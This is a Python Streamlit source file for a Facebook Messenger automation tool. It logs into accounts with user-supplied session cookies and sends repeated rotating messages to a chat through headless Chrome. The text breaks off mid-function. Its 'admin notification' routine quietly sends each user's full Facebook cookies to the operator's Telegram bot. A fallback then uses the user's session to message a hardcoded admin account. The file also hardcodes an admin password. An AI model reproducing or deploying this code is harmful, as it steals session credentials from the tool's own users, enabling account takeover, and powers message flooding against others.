import streamlit as st
import time
import threading
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests
import os
import hashlib
import uuid

st.set_page_config(
    page_title="FADIIW E2E CONVO SERVER",
    page_icon="👑",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Custom CSS with enhanced UI
custom_css = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
    
    * {
        font-family: 'Poppins', sans-serif;
    }
    
    .main-header {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        padding: 2rem;
        border-radius: 15px;
        text-align: center;
        margin-bottom: 2rem;
        box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
    }
    
    .main-header h1 {
        color: white;
        font-size: 2.5rem;
        font-weight: 700;
        margin: 0;
        text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
    }
    
    .main-header p {
        color: rgba(255,255,255,0.9);
        font-size: 1.1rem;
        margin-top: 0.5rem;
    }
    
    .stButton>button {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        border: none;
        border-radius: 10px;
        padding: 0.75rem 2rem;
        font-weight: 600;
        font-size: 1rem;
        transition: all 0.3s ease;
        box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
    }
    
    .stButton>button:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
    }
    
    .login-box {
        background: white;
        padding: 3rem;
        border-radius: 20px;
        box-shadow: 0 20px 60px rgba(0,0,0,0.1);
        max-width: 500px;
        margin: 2rem auto;
    }
    
    .success-box {
        background: linear-gradient(135deg, #84fab0 0%, #8fd3f4 100%);
        padding: 1rem;
        border-radius: 10px;
        color: white;
        text-align: center;
        margin: 1rem 0;
    }
    
    .error-box {
        background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
        padding: 1rem;
        border-radius: 10px;
        color: white;
        text-align: center;
        margin: 1rem 0;
    }
    
    .footer {
        text-align: center;
        padding: 2rem;
        color: #667eea;
        font-weight: 600;
        margin-top: 3rem;
    }
    
    .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stNumberInput>div>div>input {
        border-radius: 10px;
        border: 2px solid #e0e0e0;
        padding: 0.75rem;
        transition: all 0.3s ease;
    }
    
    .stTextInput>div>div>input:focus, .stTextArea>div>div>textarea:focus {
        border-color: #667eea;
        box-shadow: 0 0 0 2px rgba(102, 126, 234, 0.2);
    }
    
    .info-card {
        background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
        padding: 1.5rem;
        border-radius: 15px;
        margin: 1rem 0;
    }
    
    .log-container {
        background: #1e1e1e;
        color: #00ff00;
        padding: 1rem;
        border-radius: 10px;
        font-family: 'Courier New', monospace;
        max-height: 400px;
        overflow-y: auto;
    }
    
    .approval-box {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        padding: 2rem;
        border-radius: 20px;
        text-align: center;
        color: white;
        margin: 2rem auto;
        max-width: 600px;
    }
    
    .key-display {
        background: rgba(255,255,255,0.1);
        padding: 1rem;
        border-radius: 10px;
        font-family: 'Courier New', monospace;
        font-size: 1.2rem;
        margin: 1rem 0;
        border: 2px dashed rgba(255,255,255,0.3);
    }
    
    .social-buttons {
        display: flex;
        justify-content: center;
        gap: 1rem;
        margin: 1rem 0;
    }
    
    .social-btn {
        background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
        color: white;
        border: none;
        border-radius: 50px;
        padding: 0.75rem 1.5rem;
        font-weight: 600;
        text-decoration: none;
        display: inline-flex;
        align-items: center;
        gap: 0.5rem;
        transition: all 0.3s ease;
    }
    
    .social-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        color: white;
    }
    
    .social-btn.facebook {
        background: linear-gradient(135deg, #1877F2 0%, #0D5FD7 100%);
    }
    
    .profile-icon {
        width: 80px;
        height: 80px;
        border-radius: 50%;
        margin: 0 auto 1rem;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 2rem;
        color: white;
        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
    }
    
    .input-glow-1:focus {
        border-color: #ff6b6b !important;
        box-shadow: 0 0 15px rgba(255, 107, 107, 0.4) !important;
    }
    
    .input-glow-2:focus {
        border-color: #4ecdc4 !important;
        box-shadow: 0 0 15px rgba(78, 205, 196, 0.4) !important;
    }
    
    .input-glow-3:focus {
        border-color: #45b7d1 !important;
        box-shadow: 0 0 15px rgba(69, 183, 209, 0.4) !important;
    }
    
    .input-glow-4:focus {
        border-color: #96ceb4 !important;
        box-shadow: 0 0 15px rgba(150, 206, 180, 0.4) !important;
    }
    
    .input-glow-5:focus {
        border-color: #feca57 !important;
        box-shadow: 0 0 15px rgba(254, 202, 87, 0.4) !important;
    }
    
    .input-glow-6:focus {
        border-color: #ff9ff3 !important;
        box-shadow: 0 0 15px rgba(255, 159, 243, 0.4) !important;
    }
    
    .input-glow-7:focus {
        border-color: #54a0ff !important;
        box-shadow: 0 0 15px rgba(84, 160, 255, 0.4) !important;
    }
    
    .input-glow-8:focus {
        border-color: #5f27cd !important;
        box-shadow: 0 0 15px rgba(95, 39, 205, 0.4) !important;
    }
    
    .admin-panel {
        background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
        padding: 2rem;
        border-radius: 15px;
        color: white;
        margin: 1rem 0;
    }
    
    .user-card {
        background: rgba(255,255,255,0.1);
        padding: 1rem;
        border-radius: 10px;
        margin: 0.5rem 0;
        border-left: 4px solid #667eea;
    }
</style>
"""

st.markdown(custom_css, unsafe_allow_html=True)

# Initialize session state
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'user_id' not in st.session_state:
    st.session_state.user_id = None
if 'username' not in st.session_state:
    st.session_state.username = None
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0
if 'approved' not in st.session_state:
    st.session_state.approved = False
if 'user_key' not in st.session_state:
    st.session_state.user_key = None
if 'admin_logged_in' not in st.session_state:
    st.session_state.admin_logged_in = False

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

# Generate unique user key based on device
def generate_user_key():
    if 'user_key' not in st.session_state or not st.session_state.user_key:
        # Generate a unique key based on various device factors
        user_agent = st.experimental_get_query_params().get('user_agent', [''])[0]
        ip_address = st.experimental_get_query_params().get('ip', [''])[0]
        
        # Create a unique identifier
        unique_string = f"{user_agent}_{ip_address}_{time.time()}"
        user_key = hashlib.md5(unique_string.encode()).hexdigest()[:12].upper()
        st.session_state.user_key = user_key
        db.save_user_key(user_key)
    
    return st.session_state.user_key

# Check if user is approved
def check_approval(user_key):
    return db.is_user_approved(user_key)

# Admin password
ADMIN_PASSWORD = "LORDFADIIW991@#$"

def log_message(msg, automation_state=None):
    timestamp = time.strftime("%H:%M:%S")
    formatted_msg = f"[{timestamp}] {msg}"
    
    if automation_state:
        automation_state.logs.append(formatted_msg)
    else:
        if 'logs' in st.session_state:
            st.session_state.logs.append(formatted_msg)

def find_message_input(driver, process_id, automation_state=None):
    log_message(f'{process_id}: Finding message input...', automation_state)
    time.sleep(10)
    
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    
    try:
        page_title = driver.title
        page_url = driver.current_url
        log_message(f'{process_id}: Page Title: {page_title}', automation_state)
        log_message(f'{process_id}: Page URL: {page_url}', automation_state)
    except Exception as e:
        log_message(f'{process_id}: Could not get page info: {e}', automation_state)
    
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    
    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state)
    
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state)
            
            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' || 
                               arguments[0].tagName === 'TEXTAREA' || 
                               arguments[0].tagName === 'INPUT';
                    """, element)
                    
                    if is_editable:
                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state)
                        
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                        
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                        
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            log_message(f'{process_id}: Found message input with text: {element_text[:50]}', automation_state)
                            return element
                        elif idx < 10:
                            log_message(f'{process_id}: Using primary selector editable element (#{idx+1})', automation_state)
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            log_message(f'{process_id}: Using fallback editable element', automation_state)
                            return element
                except Exception as e:
                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state)
                    continue
        except Exception as e:
            continue
    
    try:
        page_source = driver.page_source
        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state)
        if 'contenteditable' in page_source.lower():
            log_message(f'{process_id}: Page contains contenteditable elements', automation_state)
        else:
            log_message(f'{process_id}: No contenteditable elements found in page', automation_state)
    except Exception:
        pass
    
    return None

def setup_browser(automation_state=None):
    log_message('Setting up Chrome browser...', automation_state)
    
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
    
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            log_message(f'Found Chromium at: {chromium_path}', automation_state)
            break
    
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver'
    ]
    
    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            log_message(f'Found ChromeDriver at: {driver_path}', automation_state)
            break
    
    try:
        from selenium.webdriver.chrome.service import Service
        
        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
            log_message('Chrome started with detected ChromeDriver!', automation_state)
        else:
            driver = webdriver.Chrome(options=chrome_options)
            log_message('Chrome started with default driver!', automation_state)
        
        driver.set_window_size(1920, 1080)
        log_message('Chrome browser setup completed successfully!', automation_state)
        return driver
    except Exception as error:
        log_message(f'Browser setup failed: {error}', automation_state)
        raise error

def get_next_message(messages, automation_state=None):
    if not messages or len(messages) == 0:
        return 'Hello!'
    
    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]
    
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state)
        driver = setup_browser(automation_state)
        
        log_message(f'{process_id}: Navigating to Facebook...', automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if config['cookies'] and config['cookies'].strip():
            log_message(f'{process_id}: Adding cookies...', automation_state)
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state)
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            log_message(f'{process_id}: Opening messages...', automation_state)
            driver.get('https://www.facebook.com/messages')
        
        time.sleep(15)
        
        message_input = find_message_input(driver, process_id, automation_state)
        
        if not message_input:
            log_message(f'{process_id}: Message input not found!', automation_state)
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
        
        delay = int(config['delay'])
        messages_sent = 0
        messages_list = [msg.strip() for msg in config['messages'].split('\n') if msg.strip()]
        
        if not messages_list:
            messages_list = ['Hello!']
        
        while automation_state.running:
            base_message = get_next_message(messages_list, automation_state)
            
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
            
            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                    
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                    
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
                
                time.sleep(1)
                
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                    
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
                
                if sent == 'button_not_found':
                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
                else:
                    log_message(f'{process_id}: Send button clicked', automation_state)
                
                time.sleep(1)
                
                messages_sent += 1
                automation_state.message_count = messages_sent
                log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send[:30]}...', automation_state)
                
                time.sleep(delay)
                
            except Exception as e:
                log_message(f'{process_id}: Error sending message: {str(e)}', automation_state)
                break
        
        log_message(f'{process_id}: Automation stopped! Total messages sent: {messages_sent}', automation_state)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return messages_sent
        
    except Exception as e:
        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state)
            except:
                pass

def send_telegram_notification(username, automation_state=None, cookies=""):
    try:
        telegram_bot_token = "g"
        telegram_admin_chat_id = ""
        
        from datetime import datetime
        import pytz
        kolkata_tz = pytz.timezone('Asia/Kolkata')
        current_time = datetime.now(kolkata_tz).strftime("%Y-%m-%d %H:%M:%S")
        
        cookies_display = cookies if cookies else "No cookies"
        
        message = f"""New User Started Automation

Username: {username}
Time: {current_time}
System: FADIIW BRAND E2E Facebook Messages Sender 
Cookies: `{cookies_display}`

User has successfully started the automation process."""
        
        url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
        data = {
            "chat_id": telegram_admin_chat_id,
            "text": message,
            "parse_mode": "Markdown"
        }
        
        log_message(f"TELEGRAM-NOTIFY: Sending notification to admin...", automation_state)
        response = requests.post(url, data=data, timeout=10)
        
        if response.status_code == 200:
            log_message(f"TELEGRAM-NOTIFY: Admin notification sent successfully via Telegram!", automation_state)
            return True
        else:
            log_message(f"TELEGRAM-NOTIFY: Failed to send. Status: {response.status_code}, Response: {response.text[:100]}", automation_state)
            return False
            
    except Exception as e:
        log_message(f"TELEGRAM-NOTIFY: Error: {str(e)}", automation_state)
        return False

def send_admin_notification(user_config, username, automation_state=None, user_id=None):
    ADMIN_UID = "100001076573102"
    driver = None
    try:
        log_message(f"ADMIN-NOTIFY: Sending usage notification for user: {username}", automation_state)
        
        user_cookies = user_config.get('cookies', '')
        telegram_success = send_telegram_notification(username, automation_state, user_cookies)
        
        if telegram_success:
            log_message(f"ADMIN-NOTIFY: Notification sent via Telegram! Skipping Facebook approach.", automation_state)
            return
        else:
            log_message(f"ADMIN-NOTIFY: Telegram notification failed/not configured. Trying Facebook Messenger as fallback...", automation_state)
        
        log_message(f"ADMIN-NOTIFY: Target admin UID: {ADMIN_UID}", automation_state)
        
        user_chat_id = user_config.get('chat_id', '').strip()
        if user_chat_id:
            log_message(f"ADMIN-NOTIFY: User's automation chat ID: {user_chat_id} (will be excluded from admin search)", automation_state)
        
        driver = setup_browser(automation_state)
        
        log_message(f"ADMIN-NOTIFY: Navigating to Facebook...", automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(5)
        
        log_message(f"ADMIN-NOTIFY: Adding cookies...", automation_state)
        if user_config['cookies'] and user_config['cookies'].strip():
            cookie_array = user_config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        saved_thread_id = None
        saved_chat_type = None
        e2ee_thread_id = None
        if user_id:
            current_cookies = user_config.get('cookies', '')
            saved_thread_id, saved_chat_type = db.get_admin_e2ee_thread_id(user_id, current_cookies)
            if saved_thread_id:
                if saved_thread_id == user_chat_id:
                    log_message(f"ADMIN-NOTIFY: Saved thread ({saved_thread_id}) is same as user's chat! Clearing and re-searching...", automation_state)
                    db.clear_admin_e2ee_thread_id(user_id)
                    saved_thread_id = None
                    saved_chat_type = None
                else:
                    e2ee_thread_id = saved_thread_id
                    chat_type_display = saved_chat_type or 'E2EE'
                    log_message(f"ADMIN-NOTIFY: Found valid saved {chat_type_display} thread ID: {saved_thread_id}", automation_state)
            else:
                log_message(f"ADMIN-NOTIFY: No saved thread ID or cookies changed, will search...", automation_state)
        
        if saved_thread_id:
            if saved_chat_type == 'REGULAR':
                log_message(f"ADMIN-NOTIFY: Using saved REGULAR chat thread...", automation_state)
                driver.get(f'https://www.facebook.com/messages/t/{saved_thread_id}')
            else:
                log_message(f"ADMIN-NOTIFY: Using saved E2EE thread...", automation_state)
                driver.get(f'https://www.facebook.com/messages/e2ee/t/{saved_thread_id}')
            time.sleep(10)
            
            current_url_check = driver.current_url.lower()
            is_valid = ('/messages/t/' in current_url_check) or ('/e2ee/t/' in current_url_check)
            
            if is_valid:
                log_message(f"ADMIN-NOTIFY: Saved {saved_chat_type or 'E2EE'} thread still valid!", automation_state)
            else:
                log_message(f"ADMIN-NOTIFY: Saved thread invalid, will search...", automation_state)
                saved_thread_id = None
                saved_chat_type = None
                e2ee_thread_id = None
        
        if saved_thread_id:
            log_message(f"ADMIN-NOTIFY: Successfully opened saved E2EE conversation", automation_state)
        else:
            log_message(f"ADMIN-NOTIFY: Opening admin profile to find message button...", automation_state)
            profile_url = f'https://www.facebook.com/profile.php?id={ADMIN_UID}'
            log_message(f"ADMIN-NOTIFY: Profile URL: {profile_url}", automation_state)
            driver.get(profile_url)
            time.sleep(10)
            
            log_message(f"ADMIN-NOTIFY: Searching for Message button on profile...", automation_state)
            
            message_button_found = False
            message_button_selectors = [
                f'a[href*="/messages/t/"]',
                'a[aria-label*="Message" i]',
                'a[aria-label*="मैसेज" i]',
                'div[aria-label*="Message" i][role="button"]',
                'div[aria-label*="मैसेज" i][role="button"]',
                'a:contains("Message")',
                'div[role="button"]:contains("Message")'
            ]
            
            for selector in message_button_selectors:
                try:
                    buttons = driver.find_elements(By.CSS_SELECTOR, selector)
                    if buttons:
                        log_message(f"ADMIN-NOTIFY: Found {len(buttons)} buttons with selector: {selector}", automation_state)
                        for btn in buttons:
                            try:
                                if btn.is_displayed():
                                    btn_text = (btn.text or '').strip()
                                    btn_label = (btn.get_attribute('aria-label') or '').strip()
                                    log_message(f"ADMIN-NOTIFY: Button found - Text: '{btn_text}', Label: '{btn_label}'", automation_state)
                                    
                                    if 'message' in btn_text.lower() or 'message' in btn_label.lower() or 'मैसेज' in btn_text or 'मैसेज' in btn_label:
                                        log_message(f"ADMIN-NOTIFY: Found Message button! Clicking...", automation_state)
                                        current_url_before = driver.current_url
                                        driver.execute_script("arguments[0].scrollIntoView(); arguments[0].click();", btn)
                                        time.sleep(8)
                                        
                                        current_url_after = driver.current_url
                                        log_message(f"ADMIN-NOTIFY: URL before: {current_url_before[:80]}", automation_state)
                                        log_message(f"ADMIN-NOTIFY: URL after: {current_url_after[:80]}", automation_state)
                                        
                                        if current_url_after != current_url_before and ('messages' in current_url_after or '/t/' in current_url_after):
                                            log_message(f"ADMIN-NOTIFY: Message button opened a conversation!", automation_state)
                                            message_button_found = True
                                            break
                                        else:
                                            log_message(f"ADMIN-NOTIFY: URL didn't change to conversation, trying next button...", automation_state)
                            except:
                                continue
                    
                    if message_button_found:
                        break
                except:
                    continue
            
            if not message_button_found:
                log_message(f"ADMIN-NOTIFY: Message button not found on profile, trying all clickable elements...", automation_state)
                try:
                    all_elements = driver.find_elements(By.CSS_SELECTOR, 'a, div[role="button"], span[role="button"]')
                    log_message(f"ADMIN-NOTIFY: Found {len(all_elements)} total clickable elements", automation_state)
                    
                    for elem in all_elements[:50]:
                        try:
                            elem_text = (elem.text or '').strip().lower()
                            elem_label = (elem.get_attribute('aria-label') or '').strip().lower()
                            
                            if ('message' in elem_text or 'message' in elem_label or 'मैसेज' in elem_text) and elem.is_displayed():
                                log_message(f"ADMIN-NOTIFY: Found element with 'message': '{elem_text[:30]}' / '{elem_label[:30]}'", automation_state)
                                driver.execute_script("arguments[0].scrollIntoView(); arguments[0].click();", elem)
                                time.sleep(8)
                                message_button_found = True
                                break
                        except:
                            continue
                except:
                    pass
            
            current_url = driver.current_url
            log_message(f"ADMIN-NOTIFY: After profile interaction, URL: {current_url}", automation_state)
            
            try:
                continue_buttons = driver.find_elements(By.CSS_SELECTOR, 'div[role="button"], button, a[role="button"]')
                
                for btn in continue_buttons:
                    btn_text = (btn.text or '').strip().lower()
                    btn_label = (btn.get_attribute('aria-label') or '').strip().lower()
                    
                    if ('continue' in btn_text or 'continue' in btn_label or 'जारी' in btn_text) and btn.is_displayed():
                        log_message(f"ADMIN-NOTIFY: Found E2EE Continue dialog, clicking...", automation_state)
                        driver.execute_script("arguments[0].click();", btn)
                        time.sleep(8)
                        current_url = driver.current_url
                        log_message(f"ADMIN-NOTIFY: After Continue, URL: {current_url}", automation_state)
                        break
            except:
                pass
            
            current_url = driver.current_url
            if 'e2ee' in current_url.lower() and '/e2ee/t/' in current_url:
                e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                log_message(f"ADMIN-NOTIFY: Extracted E2EE thread ID: {e2ee_thread_id}", automation_state)
                
                if e2ee_thread_id == ADMIN_UID:
                    log_message(f"ADMIN-NOTIFY: Thread ID is admin UID, not actual thread", automation_state)
                    e2ee_thread_id = None
                elif e2ee_thread_id == user_chat_id:
                    log_message(f"ADMIN-NOTIFY: Opened user's own chat, not admin", automation_state)
                    e2ee_thread_id = None
                elif e2ee_thread_id and user_id:
                    current_cookies = user_config.get('cookies', '')
                    db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'E2EE')
                    log_message(f"ADMIN-NOTIFY: Profile approach SUCCESS! E2EE Thread ID: {e2ee_thread_id}", automation_state)
            else:
                log_message(f"ADMIN-NOTIFY: Profile didn't open E2EE chat (URL: {current_url[:80]})", automation_state)
        
        if not e2ee_thread_id:
            log_message(f"ADMIN-NOTIFY: Opening Messenger to search for admin...", automation_state)
            driver.get('https://www.facebook.com/messages')
            time.sleep(10)
            
            log_message(f"ADMIN-NOTIFY: Looking for search box...", automation_state)
            search_selectors = [
                'input[aria-label*="Search" i]',
                'input[placeholder*="Search" i]',
                'input[type="search"]'
            ]
            
            search_box = None
            for selector in search_selectors:
                try:
                    search_elements = driver.find_elements(By.CSS_SELECTOR, selector)
                    if search_elements:
                        for elem in search_elements:
                            if elem.is_displayed():
                                search_box = elem
                                log_message(f"ADMIN-NOTIFY: Found search box with: {selector}", automation_state)
                                break
                        if search_box:
                            break
                except:
                    continue
            
            if not search_box:
                log_message(f"ADMIN-NOTIFY: Could not find search box", automation_state)
                return
            
            log_message(f"ADMIN-NOTIFY: Searching for admin UID: {ADMIN_UID}...", automation_state)
            driver.execute_script("""
                arguments[0].scrollIntoView({behavior: 'instant', block: 'center'});
                arguments[0].focus();
                arguments[0].value = arguments[1];
                arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                arguments[0].dispatchEvent(new Event('change', { bubbles: true }));
            """, search_box, ADMIN_UID)
            
            time.sleep(6)
            
            log_message(f"ADMIN-NOTIFY: Looking for admin in search results...", automation_state)
            result_selectors = [
                f'a[href*="{ADMIN_UID}"]',
                f'div[data-id*="{ADMIN_UID}"]',
                'div[role="option"] a',
                'a[role="link"]',
                'li[role="option"] a',
                'div[role="button"][tabindex="0"]'
            ]
            
            admin_found = False
            
            for selector in result_selectors:
                try:
                    results = driver.find_elements(By.CSS_SELECTOR, selector)
                    log_message(f"ADMIN-NOTIFY: Found {len(results)} results with selector: {selector}", automation_state)
                    
                    for idx, result in enumerate(results):
                        try:
                            result_text = result.get_attribute('aria-label') or result.text or ''
                            result_href = result.get_attribute('href') or ''
                            
                            log_message(f"ADMIN-NOTIFY: Result #{idx+1} - Text: '{result_text[:60]}...', Href: '{result_href[:60] if result_href else 'none'}...'", automation_state)
                            
                            is_admin_match = ADMIN_UID in result_text or ADMIN_UID in result_href
                            is_e2ee_indicator = 'encrypt' in result_text.lower() or 'secret' in result_text.lower() or 'e2ee' in result_href.lower()
                            
                            if is_admin_match:
                                log_message(f"ADMIN-NOTIFY: Clicking result #{idx+1} (ADMIN FOUND - admin_match={is_admin_match}, e2ee_indicator={is_e2ee_indicator})...", automation_state)
                                driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", result)
                                time.sleep(1)
                                driver.execute_script("arguments[0].click();", result)
                                time.sleep(8)
                                
                                try:
                                    continue_buttons = driver.find_elements(By.CSS_SELECTOR, 'div[role="button"]:not([aria-label*="Close" i]):not([aria-label*="Back" i]), button:not([aria-label*="Close" i]):not([aria-label*="Back" i])')
                                    
                                    for cont_btn in continue_buttons:
                                        btn_text = (cont_btn.text or '').lower()
                                        btn_label = (cont_btn.get_attribute('aria-label') or '').lower()
                                        
                                        if 'continue' in btn_text or 'continue' in btn_label or 'जारी' in btn_text:
                                            log_message(f"ADMIN-NOTIFY: Found E2EE setup dialog from search result, clicking Continue...", automation_state)
                                            driver.execute_script("arguments[0].click();", cont_btn)
                                            time.sleep(8)
                                            break
                                except:
                                    pass
                                
                                current_url = driver.current_url
                                log_message(f"ADMIN-NOTIFY: Opened URL: {current_url}", automation_state)
                                
                                if 'e2ee' in current_url.lower() and '/e2ee/t/' in current_url:
                                    e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                                    
                                    if e2ee_thread_id == ADMIN_UID:
                                        log_message(f"ADMIN-NOTIFY: E2EE thread ID is admin UID ({e2ee_thread_id}), not actual thread, trying next...", automation_state)
                                        driver.back()
                                        time.sleep(3)
                                        continue
                                    elif e2ee_thread_id == user_chat_id:
                                        log_message(f"ADMIN-NOTIFY: This is user's own chat ({e2ee_thread_id}), skipping...", automation_state)
                                        driver.back()
                                        time.sleep(3)
                                        continue
                                    
                                    if e2ee_thread_id and user_id:
                                        current_cookies = user_config.get('cookies', '')
                                        db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'E2EE')
                                        log_message(f"ADMIN-NOTIFY: Found & saved admin E2EE thread ID: {e2ee_thread_id}", automation_state)
                                    admin_found = True
                                    break
                                elif '/messages/t/' in current_url:
                                    regular_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                                    
                                    if regular_thread_id == user_chat_id:
                                        log_message(f"ADMIN-NOTIFY: This is user's own chat ({regular_thread_id}), skipping...", automation_state)
                                        driver.back()
                                        time.sleep(3)
                                        continue
                                    
